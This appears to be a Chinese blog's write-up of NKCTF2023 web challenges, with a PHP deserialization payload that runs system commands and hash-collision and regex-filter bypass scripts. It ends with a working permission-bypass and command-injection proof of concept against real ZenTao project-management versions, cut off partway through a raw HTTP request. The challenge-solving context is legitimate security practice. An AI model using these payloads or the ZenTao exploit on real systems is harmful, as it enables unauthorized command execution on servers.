<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="NKCTF2023">
<meta property="og:type" content="article">
<meta property="og:title" content="NKCTF2023">
<meta property="og:url" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="NKCTF2023">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/1.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/7.png">
<meta property="article:published_time" content="2023-03-26T11:29:01.000Z">
<meta property="article:modified_time" content="2023-04-25T12:15:44.590Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/03/26/NKCTF2023/1.png"><title>NKCTF2023 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/03/26/NKCTF2023/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">NKCTF2023</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-03-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h2 id="WEB-baby-php">
          <a href="#WEB-baby-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB-baby-php" class="headerlink" title="WEB:baby_php"></a>WEB:baby_php</h2>
      <p>打开之后发现是一道有关于反序列化的pop链的题目<br><img src="/2023/03/26/NKCTF2023/1.png"><br>此时我们需要捋清楚整条pop链的各个节点；首先我们发现了Happy类中的_invoke里面的eval()函数；此时我们可以确定这就<br>是整条pop链的链尾；接着我们需要知道怎么触发_invoke()函数；此时我们发现了在Hell0中的$function()；当$function()<br>被触发的时候即可触发_invoke()函数；所以我们需要触发__toString()从而来触发$function()；所以我们知道了整条链的<br>倒数第二个节点是在Hell0类中的_tostring();</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;oww!man!!&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;ItS SO CREAZY&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;name == &#x27;welcome_to_NKCTF&#x27;)&#123;</span><br><span class="line">                echo $this-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function waf($string)&#123;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $string))&#123;</span><br><span class="line">            die(&quot;you are bad&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Happy&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $shell = $this-&gt;shell;</span><br><span class="line">            $cmd = $this-&gt;cmd;</span><br><span class="line">            waf($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Hell0&#123;</span><br><span class="line">        public $func;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            $function = $this-&gt;func;</span><br><span class="line">            $function();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">$a=new Welcome;</span><br><span class="line">$b=new Happy;</span><br><span class="line">$c=new Hell0;</span><br><span class="line">$a-&gt;name=$c;</span><br><span class="line">$c-&gt;func=$b;</span><br><span class="line">$b-&gt;shell=&#x27;system&#x27;;</span><br><span class="line">$b-&gt;cmd=&#x27;more /[^b]1[^b][^b]&#x27;;</span><br><span class="line">echo(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>这个学长构造的看着会更加精悍一点</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Welcome&#123;</span><br><span class="line">  public $name;</span><br><span class="line">  public $arg;</span><br><span class="line">&#125;</span><br><span class="line">class Happy&#123;</span><br><span class="line">  public $shell;</span><br><span class="line">  public $cmd;</span><br><span class="line">&#125;</span><br><span class="line">class Hell0&#123;</span><br><span class="line">  public $func;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Welcome;</span><br><span class="line">$a -&gt; name = &quot;welcome_to_NKCTF&quot;;</span><br><span class="line">$a -&gt; arg = new Hell0;</span><br><span class="line">$a -&gt; arg -&gt;func = new Happy;</span><br><span class="line">$a -&gt; arg -&gt; func -&gt;shell = &#x27;system&#x27;;</span><br><span class="line">$a -&gt;arg -&gt;func -&gt; cmd =&#x27;more /[^b]1[^b][^b]&#x27;;</span><br><span class="line">echo(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>然后此题还有一个需要注意的点是因为此题的正则有点难搞，它把我们的flag给过滤了；所以可以使用分节符[^b]进行模糊匹配<br><img src="/2023/03/26/NKCTF2023/1.jpg"></p>

        <h2 id="WEB-eazy-php">
          <a href="#WEB-eazy-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB-eazy-php" class="headerlink" title="WEB:eazy_php"></a>WEB:eazy_php</h2>
      
        <h2 id="打开后发现是代码审计；应该是对于一些函数的绕过第一个的绕过是关于a和b的一个MD5弱比较第二个绕过是c和d的一个sha1强比较；这一部分在学校的签到杯就有出现过所以令a-x3D-s878926199a-amp-b-x3D-s155964671a来绕过第一个MD5弱比较；然后来绕过第二个sha1的强比较接着是对于intval的绕过直接使用小数点来绕过e-x3D-114514-1；接下来的绕过在NSS-Round7有出现过；直接令NS-CTF-go-x3D-1就可以绕过；接下来是对于preg-match的绕过；此时可以考虑异或绕过或者取反绕过又或者回溯绕过1-异或绕过：先生用php生成一个所以可见字符的异或构造的txt文档接着使用脚本来得到我们想要的异或结果2-使用取反绕过easy-pms-这题有思路但是最后还是没有做出来">
          <a href="#打开后发现是代码审计；应该是对于一些函数的绕过第一个的绕过是关于a和b的一个MD5弱比较第二个绕过是c和d的一个sha1强比较；这一部分在学校的签到杯就有出现过所以令a-x3D-s878926199a-amp-b-x3D-s155964671a来绕过第一个MD5弱比较；然后来绕过第二个sha1的强比较接着是对于intval的绕过直接使用小数点来绕过e-x3D-114514-1；接下来的绕过在NSS-Round7有出现过；直接令NS-CTF-go-x3D-1就可以绕过；接下来是对于preg-match的绕过；此时可以考虑异或绕过或者取反绕过又或者回溯绕过1-异或绕过：先生用php生成一个所以可见字符的异或构造的txt文档接着使用脚本来得到我们想要的异或结果2-使用取反绕过easy-pms-这题有思路但是最后还是没有做出来" class="heading-link"><i class="fas fa-link"></i></a><a href="#打开后发现是代码审计；应该是对于一些函数的绕过第一个的绕过是关于a和b的一个MD5弱比较第二个绕过是c和d的一个sha1强比较；这一部分在学校的签到杯就有出现过所以令a-x3D-s878926199a-amp-b-x3D-s155964671a来绕过第一个MD5弱比较；然后来绕过第二个sha1的强比较接着是对于intval的绕过直接使用小数点来绕过e-x3D-114514-1；接下来的绕过在NSS-Round7有出现过；直接令NS-CTF-go-x3D-1就可以绕过；接下来是对于preg-match的绕过；此时可以考虑异或绕过或者取反绕过又或者回溯绕过1-异或绕过：先生用php生成一个所以可见字符的异或构造的txt文档接着使用脚本来得到我们想要的异或结果2-使用取反绕过easy-pms-这题有思路但是最后还是没有做出来" class="headerlink" title="打开后发现是代码审计；应该是对于一些函数的绕过第一个的绕过是关于a和b的一个MD5弱比较第二个绕过是c和d的一个sha1强比较；这一部分在学校的签到杯就有出现过所以令a&#x3D;s878926199a&amp;b&#x3D;s155964671a来绕过第一个MD5弱比较；然后来绕过第二个sha1的强比较接着是对于intval的绕过直接使用小数点来绕过e&#x3D;114514.1；接下来的绕过在NSS Round7有出现过；直接令NS[CTF.go&#x3D;1就可以绕过；接下来是对于preg_match的绕过；此时可以考虑异或绕过或者取反绕过又或者回溯绕过1.异或绕过：先生用php生成一个所以可见字符的异或构造的txt文档接着使用脚本来得到我们想要的异或结果2.使用取反绕过easy_pms(这题有思路但是最后还是没有做出来)"></a>打开后发现是代码审计；应该是对于一些函数的绕过<br><img src="/2023/03/26/NKCTF2023/2.png"><br>第一个的绕过是关于a和b的一个MD5弱比较第二个绕过是c和d的一个sha1强比较；这一部分在学校的签到杯就有出现过<br>所以令a&#x3D;s878926199a&amp;b&#x3D;s155964671a来绕过第一个MD5弱比较；然后<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></div></figure><br>来绕过第二个sha1的强比较<br>接着是对于intval的绕过直接使用小数点来绕过e&#x3D;114514.1；接下来的绕过在NSS Round7有出现过；直接令NS[CTF.go&#x3D;1<br>就可以绕过；接下来是对于preg_match的绕过；此时可以考虑异或绕过或者取反绕过又或者回溯绕过<br>1.异或绕过：<br>先生用php生成一个所以可见字符的异或构造的txt文档<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">    for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">        if($i&lt;16)&#123;</span><br><span class="line">            $hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        if($j&lt;16)&#123;</span><br><span class="line">            $hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = &#x27;/[a-z0-9]/i&#x27;; //根据题目给的正则表达式修改即可</span><br><span class="line">        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        else&#123;</span><br><span class="line">        $a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">        $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">        $c=(urldecode($a)^urldecode($b));</span><br><span class="line">        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></div></figure><br>接着使用脚本来得到我们想要的异或结果<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># author yu22x</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;</span><br><span class="line">   print(param)</span><br></pre></td></tr></table></div></figure><br><img src="/2023/03/26/NKCTF2023/3.png"><br>2.使用取反绕过<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></div></figure><br>easy_pms(这题有思路但是最后还是没有做出来)</h2>
      <p>现在网上找禅道项目管理系统RCE漏洞复现+利用；此时发现一个漏洞测试的脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"># !/usr/bin/python</span><br><span class="line"> </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">权限绕过+RCE POC 伪静态传参版</span><br><span class="line">禅道系统 影响版本 安全版本</span><br><span class="line">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="line">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="line">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">proxies = &#123;</span><br><span class="line">    #&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br><span class="line">    #&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br><span class="line">&#125;</span><br><span class="line">def check(url):</span><br><span class="line">    url1 = url+&#x27;/misc-captcha-user.html&#x27;</span><br><span class="line">    # url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br><span class="line">    # url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br><span class="line">    url3 = url + &#x27;repo-create.html&#x27;</span><br><span class="line">    url4 = url + &#x27;repo-edit-10000-10000.html&#x27;</span><br><span class="line">    headers=&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Cookie&quot;:&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    headers2 = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Cookie&quot;: &quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;,</span><br><span class="line">        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,</span><br><span class="line">        &quot;Referer&quot;:url+&quot;/repo-edit-1-0.html&quot;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    data1 = &#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br><span class="line">    data2 = &#x27;SCM=Subversion&amp;client=`id`&#x27;</span><br><span class="line">    s=requests.session()</span><br><span class="line">    try:</span><br><span class="line">        req1 = s.get(url1,proxies=proxies,timeout=5,verify=False,headers=headers)</span><br><span class="line">        req3 = s.post(url3,data=data1,proxies=proxies,timeout=5,verify=False,headers=headers2)</span><br><span class="line">        req4 = s.post(url4,data=data2,proxies=proxies,timeout=5,verify=False,headers=headers2)</span><br><span class="line">        if &#x27;uid=&#x27; in req4.text:</span><br><span class="line">            print(url,&quot;&quot;)</span><br><span class="line">            return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">    return False</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(check(&quot;http://x.x.x.x/zentao/&quot;))</span><br></pre></td></tr></table></div></figure>
<p>此时经过测试是发现存在漏洞的<br><img src="/2023/03/26/NKCTF2023/4.png"><br>此时我们依次发送两个请求来激活cookie信息；因为我无法成功的登入该系统；所以采用激活cookie的方式</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">GET /misc-captcha-user.html HTTP/1.1</span><br><span class="line">Host: ******</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span 